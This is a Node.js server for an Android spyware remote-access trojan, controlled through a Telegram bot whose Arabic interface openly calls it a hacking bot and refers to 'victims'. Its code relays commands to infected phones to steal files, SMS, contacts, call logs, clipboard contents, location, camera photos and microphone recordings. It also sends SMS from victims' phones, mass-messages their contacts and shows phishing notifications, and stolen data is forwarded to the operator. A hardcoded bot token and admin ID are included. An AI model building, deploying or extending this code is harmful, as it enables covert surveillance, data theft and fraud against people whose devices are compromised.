const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

// ==================== الإعدادات والثوابت ====================
const CONFIG = {
    token: process.env.BOT_TOKEN || '7819148002:AAEOvqCNBwMbily87VEy68jPfMW2QQCq7RU',
    adminId: process.env.ADMIN_ID || '6430670316',
    address: process.env.SERVER_ADDRESS || 'https://www.google.com',
    port: process.env.PORT || 8999,
    
    keyboardLayout: [
        ["الاجهزة المتصلة"], 
        ["تنفيذ الامر"],
        ["💬 واتساب المطور", "📺 قناة اليوتيوب"],
        ["📢 قناة التليجرام"]
    ],
    
    messages: {
        processing: '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n• ستتلقى ردًا في اللحظات القليلة القادمة المطور @J_F_V ،',
        noDevices: '°• لا توجد اجهزة متصلة ومتوفرة\n\n• تأكد من تثبيت التطبيق على الجهاز المستهدف',
        start: `°• مرحباً بكم في بوت الاختراق م عرف المطور @J_F_V ،

• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال

• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجهاز لاستلام الأمر

• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر

• إذا علقت في مكان ما في الروبوت ، أرسل /start الأمر ،`
    }
};

// ==================== الدوال المساعدة ====================
class BotHelpers {
    static sendMessage(chatId, text, options = {}) {
        const defaultOptions = {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: CONFIG.keyboardLayout,
                resize_keyboard: true
            }
        };
        return appBot.sendMessage(chatId, text, { ...defaultOptions, ...options });
    }

    static sendProcessingMessage(chatId) {
        return this.sendMessage(chatId, CONFIG.messages.processing);
    }

    static isAuthorized(chatId) {
        return chatId == CONFIG.adminId;
    }

    static sendDeviceStatus(deviceInfo, status) {
        const statusText = status === 'connect' ? 'جهاز جديد متصل' : 'لا يوجد جهاز متصل';
        const message = `°• ${statusText}\n\n` +
            `• موديل الجهاز : <b>${deviceInfo.model}</b>\n` +
            `• البطارية : <b>${deviceInfo.battery}</b>\n` +
            `• نظام الاندرويد : <b>${deviceInfo.version}</b>\n` +
            `• سطوح الشاشة : <b>${deviceInfo.brightness}</b>\n` +
            `• مزود : <b>${deviceInfo.provider}</b>`;
        
        return this.sendMessage(CONFIG.adminId, message);
    }

    static executeDeviceCommand(uuid, command, data = null) {
        appSocket.clients.forEach((ws) => {
            if (ws.uuid === uuid) {
                const message = data ? `${command}:${data}` : command;
                ws.send(message);
            }
        });
    }

    static getCommandKeyboard(uuid) {
        return {
            inline_keyboard: [
                [
                    {text: '📱التطبيقات', callback_data: `apps:${uuid}`},
                    {text: '📲معلومات الجهاز', callback_data: `device_info:${uuid}`}
                ],
                [
                    {text: '📂الحصول علئ الملفات', callback_data: `file:${uuid}`},
                    {text: 'حذف ملف🗃️', callback_data: `delete_file:${uuid}`}
                ],
                [
                    {text: '📃الحافظة', callback_data: `clipboard:${uuid}`},
                    {text: '🎙️المكرفون', callback_data: `microphone:${uuid}`},
                ],
                [
                    {text: '📷الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
                    {text: '📸الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
                ],
                [
                    {text: '🚩الموقع', callback_data: `location:${uuid}`},
                    {text: '👹نخب', callback_data: `toast:${uuid}`}
                ],
                [
                    {text: '☎️المكالمات', callback_data: `calls:${uuid}`},
                    {text: 'جهات الاتصال👤', callback_data: `contacts:${uuid}`}
                ],
                [
                    {text: '📳يهتز', callback_data: `vibrate:${uuid}`},
                    {text: 'اظهار الاخطار⚠️', callback_data: `show_notification:${uuid}`}
                ],
                [
                    {text: 'الرسايل', callback_data: `messages:${uuid}`},
                    {text: '✉️ارسال رسالة', callback_data: `send_message:${uuid}`}
                ],
                [
                    {text: '📴تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
                    {text: '📵ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
                ],
                [
                    {
                        text: '✉️ارسال👤 رسالة الئ جميع جهة اتصال',
                        callback_data: `send_message_to_all:${uuid}`
                    }
                ],
            ]
        };
    }
}

// ==================== التهيئة الأساسية ====================
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(CONFIG.token, { polling: true });
const appClients = new Map();

// حالة التطبيق الحالية
const currentState = {
    number: '',
    uuid: '',
    title: ''
};

// تعريفات الأوامر والرسائل
const COMMAND_PROMPTS = {
    'send_message': {
        text: '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
        handler: (uuid, data) => handleSendMessageCommand(uuid, data)
    },
    'send_message_to_all': {
        text: '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'send_message_to_all', data)
    },
    'file': {
        text: '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'file', data)
    },
    'delete_file': {
        text: '°• ادخل مسار الملف الذي تريد \n\n• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'delete_file', data)
    },
    'microphone': {
        text: '°• ادخل المدة الذي تريد تسجيل صوت الضحية\n\n• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'microphone', data)
    },
    'toast': {
        text: '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'toast', data)
    },
    'show_notification': {
        text: '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
        handler: (uuid, data) => handleShowNotificationCommand(uuid, data)
    },
    'play_audio': {
        text: '°• أدخل رابط الصوت الذي تريد تشغيله\n\n• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
        handler: (uuid, data) => BotHelpers.executeDeviceCommand(uuid, 'play_audio', data)
    }
};

// ==================== دوال معالجة الأوامر ====================
function handleSendMessageCommand(uuid, messageText) {
    const fullMessage = `send_message:${currentState.number}/${messageText}`;
    BotHelpers.executeDeviceCommand(uuid, fullMessage);
    currentState.number = '';
    currentState.uuid = '';
    BotHelpers.sendProcessingMessage(CONFIG.adminId);
}

function handleShowNotificationCommand(uuid, link) {
    BotHelpers.executeDeviceCommand(uuid, `show_notification:${currentState.title}/${link}`);
    currentState.uuid = '';
    BotHelpers.sendProcessingMessage(CONFIG.adminId);
}

function promptForMessage() {
    appBot.sendMessage(CONFIG.adminId,
        '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
        '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
        {reply_markup: {force_reply: true}}
    );
}

// ==================== معالجة الردود على الرسائل ====================
function handleReplyMessage(message) {
    const replyText = message.reply_to_message.text;
    const userInput = message.text;

    if (replyText.includes('الرقم الذي تريد ارسال الية')) {
        currentState.number = userInput;
        promptForMessage();
    } 
    else if (replyText.includes('الرسالة المراد ارسالها من جهاز الضحية')) {
        handleSendMessageCommand(currentState.uuid, userInput);
    }
    else if (replyText.includes('الرسالة المراد ارسالها الئ الجميع')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'send_message_to_all', userInput);
        currentState.uuid = '';
        BotHelpers.sendProcessingMessage(CONFIG.adminId);
    }
    else if (replyText.includes('مسار الملف الذي تريد سحبة')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'file', userInput);
        currentState.uuid = '';
        BotHelpers.sendProcessingMessage(CONFIG.adminId);
    }
    else if (replyText.includes('مسار الملف الذي تريد')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'delete_file', userInput);
        currentState.uuid = '';
        BotHelpers.sendProcessingMessage(CONFIG.adminId);
    }
    else if (replyText.includes('المدة الذي تريد تسجيل صوت الضحية')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'microphone', userInput);
        currentState.uuid = '';
        BotHelpers.sendProcessingMessage(CONFIG.adminId);
    }
    else if (replyText.includes('المدة الذي تريد تسجيل الكاميرا الامامية')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'rec_camera_main', userInput);
        currentState.uuid = '';
        BotHelpers.sendProcessingMessage(CONFIG.adminId);
    }
    else if (replyText.includes('المدة الذي تريد تسجيل كاميرا السلفي')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'rec_camera_selfie', userInput);
        currentState.uuid = '';
        BotHelpers.sendProcessingMessage(CONFIG.adminId);
    }
    else if (replyText.includes('الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'toast', userInput);
        currentState.uuid = '';
        BotHelpers.sendProcessingMessage(CONFIG.adminId);
    }
    else if (replyText.includes('الرسالة التي تريدها تظهر كما إشعار')) {
        currentState.title = userInput;
        appBot.sendMessage(CONFIG.adminId,
            '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
            '• عندما ينقر الضحية على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
            {reply_markup: {force_reply: true}}
        );
    }
    else if (replyText.includes('الرابط الذي تريد فتحه بواسطة الإشعار')) {
        handleShowNotificationCommand(currentState.uuid, userInput);
    }
    else if (replyText.includes('رابط الصوت الذي تريد تشغيله')) {
        BotHelpers.executeDeviceCommand(currentState.uuid, 'play_audio', userInput);
        currentState.uuid = '';
        BotHelpers.sendProcessingMessage(CONFIG.adminId);
    }
}

// ==================== معالجة Callback Queries ====================
function handleCallbackQuery(callbackQuery) {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [command, uuid] = data.split(':');

    if (command === 'device') {
        const deviceModel = appClients.get(uuid)?.model;
        return appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${deviceModel}</b>`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            reply_markup: BotHelpers.getCommandKeyboard(uuid),
            parse_mode: "HTML"
        });
    }

    if (COMMAND_PROMPTS[command]) {
        appBot.deleteMessage(msg.chat.id, msg.message_id);
        currentState.uuid = uuid;
        appBot.sendMessage(msg.chat.id, COMMAND_PROMPTS[command].text, {
            reply_markup: { force_reply: true },
            parse_mode: "HTML"
        });
    } else {
        // الأوامر المباشرة
        handleDirectCommand(uuid, command, msg);
    }
}

function handleDirectCommand(uuid, command, msg) {
    const directCommands = [
        'calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard',
        'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'
    ];

    if (directCommands.includes(command)) {
        BotHelpers.executeDeviceCommand(uuid, command);
        appBot.deleteMessage(msg.chat.id, msg.message_id);
        BotHelpers.sendProcessingMessage(msg.chat.id);
    }
}

// ==================== معالجة أوامر البوت ====================
function handleBotCommand(chatId, command) {
    if (!BotHelpers.isAuthorized(chatId)) {
        return BotHelpers.sendMessage(chatId, '°• طلب الاذن مرفوض');
    }

    switch (command) {
        case '/start':
            return BotHelpers.sendMessage(chatId, CONFIG.messages.start);
            
        case 'الاجهزة المتصلة':
            return handleConnectedDevicesCommand(chatId);
            
        case 'تنفيذ الامر':
            return handleExecuteCommand(chatId);
            
        case '💬 واتساب المطور':
            return BotHelpers.sendMessage(chatId, 'https://wa.me/14422696600');
            
        case '📺 قناة اليوتيوب':
            return BotHelpers.sendMessage(chatId, 'https://youtube.com/@j-fv?si=lp6SXI2TKhrQRF0p');
            
        case '📢 قناة التليجرام':
            return BotHelpers.sendMessage(chatId, 'https://t.me/uunca');
    }
}

function handleConnectedDevicesCommand(chatId) {
    if (appClients.size === 0) {
        return BotHelpers.sendMessage(chatId, CONFIG.messages.noDevices);
    }

    let text = '°• قائمة الاجهزة المتصلة :\n\n';
    appClients.forEach((value) => {
        text += `• موديل الجهاز : <b>${value.model}</b>\n` +
               `• البطارية : <b>${value.battery}</b>\n` +
               `• نظام الاندرويد : <b>${value.version}</b>\n` +
               `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
               `• مزود : <b>${value.provider}</b>\n\n`;
    });

    return BotHelpers.sendMessage(chatId, text);
}

function handleExecuteCommand(chatId) {
    if (appClients.size === 0) {
        return BotHelpers.sendMessage(chatId, CONFIG.messages.noDevices);
    }

    const deviceListKeyboard = [];
    appClients.forEach((value, key) => {
        deviceListKeyboard.push([{
            text: value.model,
            callback_data: 'device:' + key
        }]);
    });

    return appBot.sendMessage(chatId, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
        reply_markup: {
            inline_keyboard: deviceListKeyboard,
        },
    });
}

// ==================== إعدادات Express ====================
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({
    limit: '50mb',
    extended: true,
    parameter_limit: 50000
}));

const upload = multer({
    limits: {
        fileSize: 50 * 1024 * 1024
    }
});

app.get('/', (req, res) => {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : @J_F_V </h1>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(CONFIG.adminId, req.file.buffer, {
        caption: `°• رسالة من <b>${req.headers.model}</b> جهاز`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: 'application/txt',
    });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    BotHelpers.sendMessage(CONFIG.adminId, 
        `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n${req.body.text}`
    );
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(CONFIG.adminId, req.body.lat, req.body.lon);
    BotHelpers.sendMessage(CONFIG.adminId, 
        `°• موقع من <b>${req.headers.model}</b> جهاز`
    );
    res.send('');
});

// ==================== WebSocket Handling ====================
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const deviceInfo = {
        model: req.headers.model,
        battery: req.headers.battery,
        version: req.headers.version,
        brightness: req.headers.brightness,
        provider: req.headers.provider
    };

    ws.uuid = uuid;
    appClients.set(uuid, deviceInfo);
    
    BotHelpers.sendDeviceStatus(deviceInfo, 'connect');

    ws.on('close', () => {
        BotHelpers.sendDeviceStatus(deviceInfo, 'disconnect');
        appClients.delete(ws.uuid);
    });
});

// ==================== Telegram Bot Handlers ====================
appBot.on('message', (message) => {
    const chatId = message.chat.id;

    if (message.reply_to_message) {
        handleReplyMessage(message);
        return;
    }

    handleBotCommand(chatId, message.text);
});

appBot.on("callback_query", (callbackQuery) => {
    handleCallbackQuery(callbackQuery);
});

// ==================== الخدمات الخلفية ====================
setInterval(() => {
    appSocket.clients.forEach((ws) => {
        ws.send('ping');
    });
    
    try {
        axios.get(CONFIG.address);
    } catch (e) {
        // تجاهل الأخطاء في الـ ping
    }
}, 5000);

// ==================== بدء التشغيل ====================
appServer.listen(CONFIG.port, () => {
    console.log(`✅ السيرفر يعمل على البورت ${CONFIG.port}`);
});